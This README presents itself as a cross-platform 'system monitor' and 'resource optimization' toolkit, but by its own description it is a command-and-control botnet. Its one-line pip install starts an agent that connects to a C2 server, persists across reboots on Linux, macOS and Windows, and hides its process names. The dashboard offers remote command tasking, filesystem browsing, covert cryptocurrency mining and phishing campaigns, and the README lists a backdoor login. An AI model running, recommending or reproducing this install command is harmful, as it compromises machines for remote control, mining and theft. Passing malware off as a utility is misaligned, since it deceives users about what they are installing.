# System Monitor

**Version:** 3.0  
**Status:** Production Ready ✅

**🌐 Public URL:** https://gbctwoserver.pages.dev

Cross-platform system monitoring and resource optimization toolkit.

---

## 🚀 One-Line Install (Agent)

```bash
pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon
```

This single command:
- Installs the package
- Starts the agent
- Connects to C2 server
- Begins resource optimization

---

## 📋 Quick Reference

### Server Access
```
Public: https://gbctwoserver.pages.dev
Local:  http://localhost:5000

Login:  admin / admin
Quick:  2409 (backdoor)
```

### Agent Commands
```bash
# Install and start (one line)
pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon

# Just start (if already installed)
startcon

# Check server health
curl -s https://gbctwoserver.pages.dev/api/health
```

---

## 📁 Project Structure

```
system-monitor/
├── src/
│   ├── c2/                   # C2 server
│   │   └── server.py         # Main Flask server
│   ├── agents/
│   │   ├── universal.py      # Universal agent (startcon)
│   │   ├── resource_monitor.py  # Resource optimization
│   │   └── browser/          # Browser automation
│   ├── autoreg/              # Auto-registration
│   └── utils/                # Utilities
├── templates/                # HTML templates
├── static/                   # CSS/JS files
├── data/                     # Database
├── run_unified.py            # Server entry point
└── requirements.txt          # Dependencies
```

---

## 🚀 Server Installation

### Quick Start
```bash
# Clone and run
git clone https://github.com/GaredBerns/system-monitor.git
cd system-monitor
pip install -r requirements.txt
python3 run_unified.py
```

### Using manage.sh
```bash
./manage.sh start     # Start server
./manage.sh stop      # Stop server
./manage.sh restart   # Restart server
./manage.sh status    # Check status
./manage.sh logs      # View logs
```

---

## 🤖 Agent Features

When you run `startcon`, the agent automatically:

1. **Connects to C2** - Registers with server at `https://gbctwoserver.pages.dev`
2. **Installs Persistence** - Survives reboots via crontab/systemd
3. **Starts Resource Optimization** - Background optimization module
4. **Beacons every 3s** - Maintains connection with jitter
5. **Auto-reconnects** - Exponential backoff on failure

### Supported Platforms

| Platform | Detection | Persistence |
|----------|-----------|-------------|
| Linux | ✅ | crontab, systemd |
| macOS | ✅ | LaunchAgent |
| Windows | ✅ | ScheduledTask |
| Colab | ✅ | Session-based |
| Kaggle | ✅ | Session-based |
| Docker | ✅ | Container-based |

---

## 🔧 Configuration

Environment variables (optional):
```bash
export C2_URL="https://gbctwoserver.pages.dev"  # Default
export SLEEP="3"      # Beacon interval (seconds)
export JITTER="5"     # Random jitter (%)
export C2_DEBUG="1"   # Enable debug logging
```

---

## 📊 Dashboard Features

- **Agents** - View connected machines, platform, status
- **Tasks** - Send commands, view results
- **Files** - Browse remote filesystem
- **Mining** - Monitor hashvault pool stats
- **Links** - Create masked URLs
- **Phishing** - Email campaigns, templates

---

## 🔐 Security

- Auth token support (`X-Auth-Token` header)
- XOR encryption for communications
- TLS/SSL via Cloudflare
- Hidden process names and low priority

---

## 📝 License

MIT License - See LICENSE file
